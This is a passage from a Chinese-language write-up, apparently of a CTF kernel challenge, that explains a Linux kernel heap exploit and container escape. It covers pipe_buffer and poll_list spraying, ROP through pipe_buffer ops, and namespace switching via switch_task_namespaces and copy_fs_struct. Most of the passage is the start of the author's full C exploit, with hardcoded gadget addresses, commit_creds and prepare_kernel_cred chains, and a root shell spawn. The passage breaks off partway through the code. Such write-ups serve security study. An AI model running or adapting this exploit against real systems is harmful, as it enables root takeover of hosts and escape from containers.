class="hljs-number">0</span>; i &lt; TTY_SPRAY_NR; i++)&#123;<br>       close(ptmx_id[i]);<br>   &#125;<br>   sleep(<span class="hljs-number">1</span>);<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x400</span>; i++)&#123;<br>       alloc_pipe_buffer(i);<br>   &#125;<br><br></code></pre></td></tr></table></figure><p><img src="http://imgsrc.baidu.com/forum/pic/item/aec379310a55b31928fa454105a98226cffc1787.jpg"></p><p>然后我们等待 <code>poll_list</code>计时器到达然后进行释放，这里就会释放掉我们 <code>target-0x18</code>开头的虚假 1k object，然后我们此时堆喷1k大小的 user_key_payload就可以写入pipe_buffer了，此时我们可以修改他的ops函数数组来进行ROP</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/a2cc7cd98d1001e97a47d33bfe0e7bec54e7978f.jpg"></p><p>这样最后找到合适的gadget即可进行提权</p><h3 id="5-容器逃逸"><a href="#5-容器逃逸" class="headerlink" title="5.容器逃逸"></a>5.容器逃逸</h3><p>这里虽然说我们已经可以进行提权，但是还完全不够，因为提升的权限仅仅是我们docker容器的root权限，并不是我们真正的root，因此这里需要我们进行下一步操作</p><p>我们在容器中可以通过内核函数 <code>find_task_by_vpid</code>来寻找task_struct，这里我们可以首先在容器内部完成提权，然后使用函数 <code>find_task_by_vpid(1)</code>来获得**容器中的init&#x2F;swap进程的 <code>task_struct</code>**，</p><p>容器中的逃逸并不像vm那样存在<code>hypervisor</code>，这里我们只需要进行命名空间的切换即可，而常用的切换命名空间的系统调用例如 <code>unshare、setns</code>都被seccomp禁用，因此我们利用一个替换者那就是 <code>switch_task_namespaces()</code></p><p>我们将当前命名空间下的init进程的命名空间切换为**内核当中的 <code>init_proxy</code><strong>，</strong>这里是由内核当中提取的，并不是docker当中的 <code>init_proxy</code>**，总结下来就是调用下面的函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">switch<span class="hljs-constructor">_task_namespaces(<span class="hljs-params">task</span>, <span class="hljs-params">init_proxy</span>)</span>;<br></code></pre></td></tr></table></figure><p>但是上面的部分还不足成功逃逸，</p><p>由于setns被过滤，这导致我们无法在返回用户空间后进入其他的命名空间，因此我们需要模拟 setns()函数中的 <code>commit_nsset()</code>功能，我们利用函数 <code>copy_fs_struct</code> 获取内核当中的 <code>init_fs</code>所对应的 <code>fs_struct</code>结构体，然后赋值给我们当前进程的 <code>task_struct-&gt;fs</code>，这样就实现了资源的转移，也就是说调用下面的函数</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">find_task_by_vpid<span class="hljs-function"><span class="hljs-params">(getpid())</span>-&gt;</span>fs = copy_fs_struct(init_fs);<br></code></pre></td></tr></table></figure><p><img src="http://imgsrc.baidu.com/forum/pic/item/b999a9014c086e06f814fe7f44087bf40ad1cb43.jpg"></p><p>最终exp如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>              </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span>          </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span>       </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>      </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USER_KEY_PAYLOAD_SPRAY_NR 199</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_SPRAY_NR 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_SPRAY_NR 72</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEY_SPEC_PROCESS_KEYRING-2<span class="hljs-comment">/* - key ID for process-specific keyring */</span></span><br><br><span class="hljs-comment">/* keyctl commands */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UPDATE2<span class="hljs-comment">/* update a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_REVOKE3<span class="hljs-comment">/* revoke a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UNLINK9<span class="hljs-comment">/* unlink a key from a keyring */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_READ11<span class="hljs-comment">/* read a key or keyring&#x27;s contents */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KERNEL_MASK 0xffffffff00000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HEAP_MASK 0xffff000000000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VMMAP_MASK 0xffffe00000000000</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_STACK_PPS 240</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POLL_LIST_SIZE 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POLLFD_SIZE 8;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SINGLE_START 0xffffffff812d0e30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROC_SINGLE_SHOW 0xffffffff81323390</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810e8e70</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810e8bf0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RSI_JMP_RSI_39 0xffffffff815986b6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSP_RET 0xffffffff81000755</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_RSP_50_RET 0xffffffff8115c0a1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81001cb9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSI_RET 0xffffffff810033a5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_RET 0xffffffff81029a73</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_AND_RETURN_TO_USERMDOE 0xffffffff81c00f06</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FIND_TASK_BY_VPID 0xffffffff810e20f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_NSPROXY 0xffffffff8245a760</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_FS 0xffffffff82589780</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWITCH_TASK_NAMESPACES 0xffffffff810e7300</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COPY_FS_STRUCT 0xffffffff812e45f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RCX_RAX 0xffffffff814e97e4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_RAX_R8 0xffffffff81565011</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_R8 0xffffffff811e23b1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RAX_RCX 0xffffffff81039dda</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff8101f89c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RCX_POP_RBX 0xffffffff8142c457</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RAX_RBX_POP_4 0xffffffff817a6b69</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:0x%lx\n&quot;</span>, str, x)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[x]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss,user_rflags,user_sp;<br><br><span class="hljs-comment">//int fd = 0;        // file pointer of process &#x27;core&#x27;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[+]Status has been saved . \033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())&#123;<br>        info_log(<span class="hljs-string">&quot;Congratulation! We Win!!!&quot;</span>);<br>        system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>    &#125;<br>    error_log(<span class="hljs-string">&quot;get root failed!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">debug</span><span class="hljs-params">()</span>&#123;<br>    info_log(<span class="hljs-string">&quot;Debugging here!&quot;</span>);<br>    getchar();<br>&#125;<br><br><span class="hljs-type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;<br><span class="hljs-type">pthread_t</span> poll_tid[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">int</span> fds[<span class="hljs-number">0x100</span>];  <span class="hljs-comment">//monitor target fd</span><br><span class="hljs-type">int</span> poll_threads;<br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> kernel_base;<br><span class="hljs-type">size_t</span> page_offset_base;<br><span class="hljs-type">int</span> key_id[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">int</span> seq_id[SEQ_SPRAY_NR + <span class="hljs-number">128</span>];<br><span class="hljs-type">int</span> ptmx_id[TTY_SPRAY_NR];<br><span class="hljs-type">int</span> pipe_id[<span class="hljs-number">0x400</span>][<span class="hljs-number">2</span>];<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">poll_args</span>&#123;</span><br>    <span class="hljs-type">int</span> t_id;           <span class="hljs-comment">//thread_id</span><br>    <span class="hljs-type">int</span> size;           <span class="hljs-comment">//the size you want to allocated</span><br>    <span class="hljs-type">int</span> timeout;<br>    <span class="hljs-type">int</span> hang;<br>&#125;;<br><br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    <span class="hljs-keyword">if</span>(sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;bind core failed..&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_thread_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    <span class="hljs-keyword">if</span>(pthread_setaffinity_np(pthread_self(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;bind core failed...&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">alloc_poll_list</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> *<span class="hljs-title">pfds</span>;</span><br>    <span class="hljs-type">int</span> id, want_size, timeout, nfds, hang;<br>    id = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;t_id;<br>    want_size = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;size;<br>    timeout = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;timeout;<br>    hang = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;hang;<br>    <br>    <span class="hljs-comment">/* nfds need modify :) */</span><br>    want_size = want_size - ((want_size/PAGE_SIZE)+<span class="hljs-number">1</span>)*POLL_LIST_SIZE;<br>    nfds = (N_STACK_PPS + want_size)/POLLFD_SIZE;<br>    <br>    pfds = <span class="hljs-built_in">calloc</span>(nfds, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pollfd));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nfds; i++)&#123;<br>        pfds[i].fd = fds[<span class="hljs-number">0</span>];<br>        pfds[i].events = POLLERR;<br>    &#125;<br>    bind_thread_core(<span class="hljs-number">0</span>);<br>    pthread_mutex_lock(&amp;mutex);<br>    poll_threads++;<br>    pthread_mutex_unlock(&amp;mutex);<br>    poll(pfds, nfds, timeout);<br>    bind_thread_core(<span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-keyword">if</span>(hang)&#123;<br>        pthread_mutex_lock(&amp;mutex);<br>        poll_threads--;<br>        pthread_mutex_unlock(&amp;mutex);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;&#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_poll_thread</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> timeout, <span class="hljs-type">int</span> hang)</span>&#123;<br>    <span class="hljs-type">int</span> judge;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">poll_args</span> *<span class="hljs-title">args</span>;</span><br>    <span class="hljs-keyword">if</span>(id &lt; <span class="hljs-number">0</span> || size &lt; <span class="hljs-number">0</span> || timeout &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x]create_poll_thread: Wrong argument!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* Include the poll_list head */</span><br>    <span class="hljs-keyword">if</span>(!(size%PAGE_SIZE == <span class="hljs-number">0</span> || size%PAGE_SIZE &gt; <span class="hljs-number">0x10</span>))&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x]create_poll_thread: size you want have to be suitable!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    args = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> poll_args));<br>    <span class="hljs-keyword">if</span>(args == <span class="hljs-literal">NULL</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Calloc faield!&quot;</span>);<br>    &#125;<br>    args-&gt;t_id = id;<br>    args-&gt;size = size;<br>    args-&gt;timeout = timeout;<br>    args-&gt;hang = hang;<br>    <br>    <span class="hljs-keyword">if</span>(pthread_create(&amp;poll_tid[id], <span class="hljs-literal">NULL</span>, alloc_poll_list, args) != <span class="hljs-number">0</span>)&#123;<br>        